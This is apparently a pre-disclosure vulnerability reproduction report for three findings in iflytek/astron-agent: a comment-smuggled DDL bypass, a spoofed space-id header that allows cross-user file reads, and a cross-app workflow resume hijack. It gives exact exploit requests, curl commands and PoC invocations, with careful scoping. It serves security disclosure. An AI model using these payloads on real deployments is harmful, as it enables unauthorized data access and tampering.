# astron-agent — reproduction report

Three findings in `iflytek/astron-agent`, reproduced against the reporter's own
local deployment. This is the trail a reviewer follows: environment, exact steps,
expected output, and — for each finding — what was *not* demonstrated.

Disclosure state at the time of writing: **not yet reported** to the vendor or any
CNA. See `README.md`.

---

## Environment

| Item | Value |
|---|---|
| Target | `iflytek/astron-agent` |
| Commit tested | `b4f8ed57460cbfb32016a4afd3fd7212987d33c3` (main; clean checkout) |
| Releases verified | `v1.1.2` contains the same code paths for V1 and V3; `v1.1.1` and `v1.1.2` verified for V2 |
| Deployment | unmodified stock `docker/astronAgent` compose stack; one image override pinning `minio` to a locally available image; no security-relevant setting changed |
| PostgreSQL | the compose-shipped `spark` / `spark123` role (created as a superuser by the official image) — `docker-compose.yaml:145` |
| Network | tests ran inside the compose network. `core-database:7990` and `core-workflow:7880` are not published to the host by the stock files; the public entry is `nginx` |
| Tooling | the PoC scripts use only the Python standard library |

Earlier releases were not exhaustively checked for any finding; affected-version
claims in `cve/*.cve.json` are limited to the snapshots above.

---

## V1 — DDL whitelist bypass via comment smuggling

**Defect.** `exec_ddl` decides the statement kind for SQLGlot `exp.Command` nodes by
searching the raw SQL string for `\bALTER\s+TABLE\b`
(`core/memory/database/api/v1/exec_ddl.py:60-80`). The route is mounted without
request authentication (`core/memory/database/main.py:114`).

**Preconditions.**

1. Network reachability to `core-database:7990` (cluster-internal by default; the
   stock compose/Helm files do not publish the port).
2. No credential. The caller mints its own `database_id`/`uid` pair through the
   equally unauthenticated `/xingchen-db/v1/create_database`.

**Steps.**

```
# 1. create a test database (returns data.database_id)
POST /xingchen-db/v1/create_database
{"database_name":"astron_poc_v1_0001","uid":"astron-agent-poc"}

# 2. negative control — expected: code 25040, "DDL syntax not allowed"
POST /xingchen-db/v1/exec_ddl
{"database_id":<id>,"uid":"astron-agent-poc","ddl":"CREATE EXTENSION IF NOT EXISTS dblink"}

# 3. the same statement behind a comment — expected: code 0
POST /xingchen-db/v1/exec_ddl
{"database_id":<id>,"uid":"astron-agent-poc","ddl":"/* ALTER TABLE */ CREATE EXTENSION IF NOT EXISTS dblink"}

# 4. server-side check: \dx in the test database shows dblink installed
```

Or run the script, which performs all four steps plus cleanup:

```
python3 poc/v1_ddl_whitelist_comment_smuggling.py --base http://core-database:7990 --confirm-authorised
echo "exit=$?"   # 0 when the differential in steps 2/3 is observed
python3 poc/v1_ddl_whitelist_comment_smuggling.py --base http://core-database:7990
# must refuse without --confirm-authorised, non-zero exit
```

**Expected output.** Step 2 rejected with code 25040; step 3 accepted with code 0;
`\dx` shows `dblink`. The comment is the only difference between the accepted and
rejected statements.

**Observed record.** `evidence/01-ddl-whitelist-bypass.txt`.

**Why the bare command is rejected at all.** SQLGlot 26.29.0 (`uv.lock:1916`) parses
`CREATE EXTENSION` to `exp.Command` with `.key == "command"`, which is not in the
allowlist; the bypass exists only through the raw-string regex branch. This
distinction matters for the fix: patching the regex is not enough — the Command
branch must refuse, not guess.

**What was NOT demonstrated.** File reading, cross-schema access, host-level code
execution. The superuser connection role makes further escalation plausible; it was
not pursued and is not claimed. The claim ends at "a whitelisted-rejected command
executes".

**Severity.** 6.3 Medium — `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`. `AV:A`
because the unauthenticated port is cluster-internal in the stock deployment; `S:U`
per FIRST guidance that a database used solely by the application lies within that
application's security scope; low C/I/A because the demonstrated effect is
extension installation in a caller-owned test database.

---

## V2 — cross-user knowledge-file read via the space-id header

**Defect.** `FileInfoV2Service.listKnowledgeByPage` skips `checkFileBelong` whenever
the client-supplied `space-id` header parses as a Java Long
(`console/backend/toolkit/.../FileInfoV2Service.java:903-930`; header parsing in
`console/backend/commons/.../SpaceInfoUtil.java:64-72`). Session authentication is
still enforced (`SecurityConfig.java:124-126`) — the missing check is object-level.

**Preconditions.**

1. A valid low-privilege Console JWT (the attacker's own ordinary account).
2. Knowledge or discovery of a target file id owned by another user/space.
3. Reachability of the Console API (the deployment's normal public entry).

**Steps.**

```
# baseline: same caller, same file, NO header — expected: denied / no records
curl -s -X POST "$BASE/file/list-knowledge-by-page" \
  -H "Authorization: Bearer $ATTACKER_JWT" -H "Content-Type: application/json" \
  -d '{"fileIds":[9001],"pageNo":1,"pageSize":10}'

# exploit: identical request plus an arbitrary numeric header
curl -s -X POST "$BASE/file/list-knowledge-by-page" \
  -H "Authorization: Bearer $ATTACKER_JWT" -H "Content-Type: application/json" \
  -H "space-id: 1" \
  -d '{"fileIds":[9001],"pageNo":1,"pageSize":10}'
```

Or run the script, which asserts the differential:

```
python3 poc/v2_knowledge_space_id_bypass.py --base "$BASE" \
    --jwt "$ATTACKER_JWT" --victim-file-id 9001 --confirm-authorised
echo "exit=$?"   # 0 when the differential is observed
```

**Expected output.** The baseline response contains no knowledge records for the
victim file; the header response does. The header value `1` is arbitrary — it need
not be the victim's real space id, which is what makes this a
user-controlled-key bypass (CWE-639) rather than a space-membership confusion.

**Observed record.** `evidence/02-console-space-id-bypass.txt` (two ordinary test
users; the differential was observed on the local deployment).

**What was NOT demonstrated.** Write, delete or availability impact on this
endpoint; other endpoints that consume the same header were not tested — each
would need its own evidence. The claim is one endpoint, read-only.

**Severity.** 6.5 Medium — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`. The read
is high-consequence confidentiality (knowledge content), gated only by an ordinary
account.

---

## V3 — `/workflow/v1/resume` cross-app ownership gap

**Defect.** `resume_open` resolves the paused event by the caller-supplied
`event_id` and never compares the event's owning `app_id` to the authenticated
caller's app (`core/workflow/api/v1/chat/open.py:106-165`). The endpoint is
authenticated (`CHAT_OPEN_API_PATHS`,
`core/workflow/extensions/fastapi/base.py:19-23`; middleware verification in
`core/workflow/extensions/fastapi/middleware/auth.py:170-185`).

**Preconditions.**

1. Two separately registered applications on the target, each with its own valid
   Bearer credential (victim app, attacker app).
2. A released flow owned by the victim app that pauses at a question-answer node
   (`needReply=true`); seed provided in `env/payloads/seed_victim_flow.sql`.
3. The attacker must hold the `event_id` during the pause window. The platform
   publishes it on the owner's own SSE INTERRUPT frame; it is a Snowflake id
   (`core/common/utils/snowfake.py:12`). The event expires with the node's
   timeout, which bounds the window.

**Steps.**

```
# 1. victim app runs the flow (stream); read the INTERRUPT frame's event_id
POST /workflow/v1/chat/completions
Authorization: Bearer $VICTIM_KEY:$VICTIM_SECRET
{"flow_id":"<seeded>","uid":"victim_user","stream":true,
 "parameters":{"AGENT_USER_INPUT":"victim original input"},
 "chat_id":"<test id>","ext":{}}

# 2. attacker app resumes the SAME event
POST /workflow/v1/resume
Authorization: Bearer $ATTACKER_KEY:$ATTACKER_SECRET
{"event_id":"<step-1 event_id>","event_type":"resume",
 "content":"ATTACKER-INJECTED-CONTENT: transfer approved"}
```

Or run the script, which does both steps and asserts the outcome:

```
python3 poc/v3_workflow_resume_event_authz.py --base http://core-workflow:7880 \
    --victim-credential "$VICTIM_KEY:$VICTIM_SECRET" \
    --attacker-credential "$ATTACKER_KEY:$ATTACKER_SECRET" \
    --flow-id "<seeded>" --confirm-authorised
echo "exit=$?"   # 0 when the attacker's resume is accepted and the engine runs
```

**Expected output.** Step 1 ends with an INTERRUPT frame containing `event_id`.
Step 2 returns HTTP 200 on the attacker's connection; the engine echoes the
injected content as the node's answer (`progress` advances past the paused node)
and streams to `finish_reason: stop` on the attacker's connection. The victim's
stream does not receive the post-resume output.

**Observed record.** `evidence/03-workflow-resume-authz.txt` — reproduced twice,
once via the debug path and once via the production `chat/completions` path
(event ids `7511014748023123968` and `7511016939479855104` on the reporter's local
deployment).

**What this is NOT.** Not an authentication bypass: an invalid Bearer is rejected
by the middleware before the handler. Not cross-event access: the attacker must
hold the specific paused event's id. Events outside INTERRUPT status are
unreachable through this defect.

**What was NOT demonstrated.** Exhaustive enumeration of `event_id` observation
channels available to a remote attacker. The owner's SSE frame is documented and
sufficient for the local chain; logs, traces and Kafka echoes are noted as
plausible further channels but were not all separately exercised. The public
gateway entry (`nginx.conf:139`) fronts the same path with `auth_request`; the
PoC ran against the service address, and gateway-specific behavior is left to the
operator to verify.

**Severity.** 6.8 Medium — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N`. `AC:H`
reflects the two simultaneous prerequisites (a second app's valid credential plus
observation of the event id inside the pause window).

---

## Cross-cutting honesty notes

- Every claim above traces to a run on the reporter's own deployment. Where a
  statement is source-derived rather than run-derived (for example Helm
  exposure defaults), it is marked as such in the text.
- The evidence files are redacted session records, not full packet captures;
  `evidence/README.md` states this and the PoC scripts regenerate complete
  transcripts.
- Version claims are limited to the snapshots listed under Environment. Earlier
  releases were not exhaustively checked.
